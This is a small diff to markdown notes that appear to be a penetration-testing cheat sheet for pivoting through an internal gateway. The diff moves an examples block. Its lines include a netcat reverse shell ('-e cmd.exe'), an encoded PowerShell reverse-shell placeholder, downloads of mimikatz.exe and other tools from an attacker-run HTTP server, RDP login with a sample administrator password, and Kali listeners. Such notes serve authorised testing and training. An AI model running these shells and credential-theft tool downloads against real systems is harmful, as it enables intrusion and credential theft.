@@ -73,15 +73,13 @@ PS> nc.exe $InternalGatewayIpOnEth1 $Port1 -e cmd.exe
 PS> iwr -uri http://$InternalGatewayIpOnEth1:$Port3/somepentestingtool.exe -outfile tool.exe
 ```
 
-Examples:
-- `0.0.0.0:4446` -> `127.0.0.1:4446` then `powershell -e base64enc($InternalIpForAgent01 $4446)`
-- `0.0.0.0:8081` -> `127.0.0.1:8081` then `iwr -uri http://$InternalIpForAgent01:8181/mimikatz.exe -outfile mimi.exe` (and `python3 -m http.server 8081` in `/var/www/html`)
-- `0.0.0.0:3389` -> `$IpForTarget02:3389` then `xfreerdp /u:Administrator /p:adminpass /v:$ExternalIpForAgent01`
-
 On Kali:
 ```
 nc -lnpu $Port2
 python3 -m http.server $Port4
 ```
 
-
+Examples:
+- `0.0.0.0:4446` -> `127.0.0.1:4446` then `powershell -e base64enc($InternalIpForAgent01 $4446)`
+- `0.0.0.0:8081` -> `127.0.0.1:8081` then `iwr -uri http://$InternalIpForAgent01:8181/mimikatz.exe -outfile mimi.exe` (and `python3 -m http.server 8081` in `/var/www/html`)
+- `0.0.0.0:3389` -> `$IpForTarget02:3389` then `xfreerdp /u:Administrator /p:adminpass /v:$ExternalIpForAgent01`
